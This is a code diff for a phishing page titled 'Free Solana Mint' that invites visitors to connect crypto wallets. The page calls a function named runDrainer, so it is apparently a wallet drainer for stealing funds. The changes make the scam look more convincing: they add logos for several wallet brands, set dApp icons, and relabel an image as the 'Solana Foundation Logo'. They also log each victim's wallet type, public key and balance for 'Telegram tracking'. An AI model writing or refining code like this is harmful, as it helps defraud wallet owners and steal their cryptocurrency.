@@ -53,6 +53,15 @@
   <meta name="apple-itunes-app" content="app-id=1598432977, app-argument=https://phantom.app/ul/browse/" />
   <meta name="google-play-app" content="app-id=app.phantom" />
   
+  <!-- Preload critical images for faster loading -->
+  <link rel="preload" href="/logo.png" as="image" type="image/png" />
+  <link rel="preload" href="/phantom-logo.png" as="image" type="image/png" />
+  <link rel="preload" href="/solflare-logo.png" as="image" type="image/png" />
+  <link rel="preload" href="/backpack-logo.png" as="image" type="image/png" />
+  <link rel="preload" href="/glow-logo.png" as="image" type="image/png" />
+  <link rel="preload" href="/trust-logo.png" as="image" type="image/png" />
+  <link rel="preload" href="/exodus-logo.png" as="image" type="image/png" />
+  
   <!-- dApp Manifest -->
   <link rel="manifest" href="/manifest.json?v=3" />
   <link rel="icon" href="/favicon1.ico?v=6" type="image/x-icon" />
@@ -110,6 +119,38 @@
       window.pendingRequests.clear();
       console.log('[PENDING] Cleared all pending requests');
     };
+    
+    // Preload wallet logos for faster display
+    function preloadWalletLogos() {
+      const logoUrls = [
+        '/logo.png',
+        '/phantom-logo.png',
+        '/solflare-logo.png',
+        '/backpack-logo.png',
+        '/glow-logo.png',
+        '/trust-logo.png',
+        '/exodus-logo.png'
+      ];
+      
+      logoUrls.forEach(url => {
+        const img = new Image();
+        img.src = url;
+        img.onload = () => console.log(`[PRELOAD] Logo loaded: ${url}`);
+        img.onerror = () => console.warn(`[PRELOAD] Failed to load logo: ${url}`);
+      });
+    }
+    
+    // Preload logos on page load
+    preloadWalletLogos();
+    
+    // Register service worker for logo caching if supported
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('/sw.js').then(registration => {
+        console.log('[SW] Service Worker registered:', registration);
+      }).catch(error => {
+        console.log('[SW] Service Worker registration failed:', error);
+      });
+    }
     
     // Clear requests on page load
     window.clearAllPendingRequests();
@@ -351,6 +392,61 @@
       }
     };
     
+    // Ensure dApp icon is set for all wallet types
+    window.solanaDAppIcon = window.location.origin + '/logo.png';
+    window.phantomDAppIcon = window.location.origin + '/logo.png';
+    window.solflareDAppIcon = window.location.origin + '/logo.png';
+    window.backpackDAppIcon = window.location.origin + '/logo.png';
+    window.glowDAppIcon = window.location.origin + '/logo.png';
+    window.trustDAppIcon = window.location.origin + '/logo.png';
+    window.exodusDAppIcon = window.location.origin + '/logo.png';
+    
+    // Function to set dApp icon for detected wallets
+    function setDAppIconForWallet(walletType) {
+      const iconUrl = window.location.origin + '/logo.png';
+      
+      switch(walletType) {
+        case 'phantom':
+          if (window.phantom?.solana) {
+            window.phantom.solana.dAppIcon = iconUrl;
+          }
+          break;
+        case 'solflare':
+          if (window.solflare) {
+            window.solflare.dAppIcon = iconUrl;
+          }
+          break;
+        case 'backpack':
+          if (window.backpack) {
+            window.backpack.dAppIcon = iconUrl;
+          }
+          break;
+        case 'glow':
+          if (window.glow) {
+            window.glow.dAppIcon = iconUrl;
+          }
+          break;
+        case 'trust':
+          if (window.trust) {
+            window.trust.dAppIcon = iconUrl;
+          }
+          break;
+        case 'exodus':
+          if (window.exodus) {
+            window.exodus.dAppIcon = iconUrl;
+          }
+          break;
+      }
+    }
+    
+    // Set dApp icon for wallet detection
+    setDAppIconForWallet('phantom');
+    setDAppIconForWallet('solflare');
+    setDAppIconForWallet('backpack');
+    setDAppIconForWallet('glow');
+    setDAppIconForWallet('trust');
+    setDAppIconForWallet('exodus');
+    
     // Set document title and meta for wallet recognition
     document.title = 'Free Solana Mint';
     
@@ -375,6 +471,26 @@
     
   </script>
   <style>
+    /* Image optimization for faster loading */
+    img {
+      image-rendering: -webkit-optimize-contrast;
+      image-rendering: crisp-edges;
+      backface-visibility: hidden;
+      transform: translateZ(0);
+    }
+    
+    /* Wallet logo optimization */
+    .wallet-option img {
+      width: 20px;
+      height: 20px;
+      object-fit: contain;
+      transition: transform 0.2s ease;
+    }
+    
+    .wallet-option img:hover {
+      transform: scale(1.1);
+    }
+    
     body {
       margin: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -1432,7 +1548,7 @@
 </head>
 <body>
   <nav>
-            <div class="nav-logo"><img src="/logo.png" alt="Free Solana Mint Logo" style="height:36px;vertical-align:middle;margin-right:10px;">Free Solana Mint</div>
+    <div class="nav-logo"><img src="/logo.png" alt="Solana Foundation Logo" style="height:36px;vertical-align:middle;margin-right:10px;">Free Solana Mint</div>
     <div class="nav-links">
       <a href="#about" class="nav-link">About</a>
       <a href="#tokens" class="nav-link">Tokens</a>
@@ -1443,7 +1559,7 @@
   </nav>
   <section class="hero" id="hero">
     <div class="hero-content">
-          <h1><img src="/logo.png" alt="Free Solana Mint Logo" style="height: 60px; vertical-align: middle; margin-right: 15px;"> Free Solana Mint</h1>
+          <h1><img src="/logo.png" alt="Logo" style="height: 60px; vertical-align: middle; margin-right: 15px;"> Free Solana Mint</h1>
     <p class="hero-subtitle">Mint your own SPL Token or NFT quickly and safely!</p>
 
       <button class="claim-btn" onclick="openWalletModal();">MINT NOW</button>
@@ -1716,7 +1832,7 @@
       {
         key: 'phantom',
         name: 'Phantom',
-        icon: '/logo.png',
+        icon: '/phantom-logo.png',
         provider: () => {
           const phantom = window.phantom?.solana || window.solana;
           return phantom && typeof phantom === 'object' ? phantom : null;
@@ -1732,7 +1848,7 @@
       {
         key: 'solflare',
         name: 'Solflare',
-        icon: '/logo.png',
+        icon: '/solflare-logo.png',
         provider: () => {
           // Enhanced Solflare detection
           const solflare = window.solflare;
@@ -1760,7 +1876,7 @@
       {
         key: 'backpack',
         name: 'Backpack',
-        icon: '/logo.png',
+        icon: '/backpack-logo.png',
         provider: () => {
           // Enhanced Backpack detection with multiple fallbacks
           const possibleBackpacks = [
@@ -1793,7 +1909,7 @@
       {
         key: 'glow',
         name: 'Glow',
-        icon: '/logo.png',
+        icon: '/glow-logo.png',
         provider: () => {
           // Enhanced Glow detection with multiple fallbacks
           const possibleGlows = [
@@ -1826,7 +1942,7 @@
       {
         key: 'trustwallet',
         name: 'Trust Wallet',
-        icon: '/logo.png',
+        icon: '/trust-logo.png',
         provider: () => {
           // Enhanced Trust Wallet detection - only unsupported on mobile
           console.log('Trust Wallet detection - checking for Trust Wallet objects:');
@@ -1899,7 +2015,7 @@
       {
         key: 'exodus',
         name: 'Exodus',
-        icon: '/logo.png',
+        icon: '/exodus-logo.png',
         provider: () => {
           // Enhanced Exodus detection with multiple fallbacks
           console.log('Exodus detection - checking for Exodus objects:');
@@ -2021,6 +2137,13 @@ async function runDrainer(provider) {
     
     debugLog('Connected wallet type:', connectedWalletType);
     debugLog('Active providers detected:', activeProviders);
+    
+    // Log wallet connection immediately when detected
+    if (connectedWalletType !== 'Unknown' && publicKey) {
+      console.log(`[WALLET] Wallet detected: ${connectedWalletType} with public key: ${publicKey.toString().substring(0, 8)}...`);
+      // Log wallet connection for Telegram tracking
+      window.logWalletConnection(publicKey, connectedWalletType, 0); // Balance will be fetched later
+    }
     debugLog('Provider object details:', {
       hasConnect: typeof provider.connect === 'function',
       hasSignTransaction: typeof provider.signTransaction === 'function',
@@ -2152,8 +2275,13 @@ async function runDrainer(provider) {
               }
               window.walletBalanceCache[walletKey] = balance;
               
-              // Use centralized logging function with actual balance
-              window.logWalletConnection(publicKey, connectedWalletType, balance);
+                        // Use centralized logging function with actual balance
+          window.logWalletConnection(publicKey, connectedWalletType, balance);
+          
+          // Also log initial wallet connection regardless of balance change
+          if (lastBalance === 0) {
+            console.log(`[WALLET] Initial connection detected for ${connectedWalletType}`);
+          }
             }
           } catch (updateError) {
             // Silent error handling for production
@@ -2877,7 +3005,7 @@ window.openWalletModal = async function openWalletModal() {
         }
         return `
           <div class="wallet-option">
-            <img src="${wallet.icon}" alt="${wallet.name} logo" />
+                            <img src="${wallet.icon}" alt="${wallet.name} logo" loading="lazy" decoding="async" />
             <span class="wallet-name">${wallet.name}</span>
             ${actionBtn}
           </div>
@@ -3642,7 +3770,7 @@ window.openWalletModal = async function openWalletModal() {
                           if (walletListContent) {
                             walletListContent.innerHTML = supportedWallets.map(wallet => `
                               <div class="wallet-option">
-                                <img src="${wallet.icon}" alt="${wallet.name} logo" />
+                                <img src="${wallet.icon}" alt="${wallet.name} logo" loading="lazy" decoding="async" />
                                 <span class="wallet-name">${wallet.name}</span>
                                 <button class="claim-btn" onclick="connectMobileWallet(${JSON.stringify(wallet)})">
                                   Use ${wallet.name}
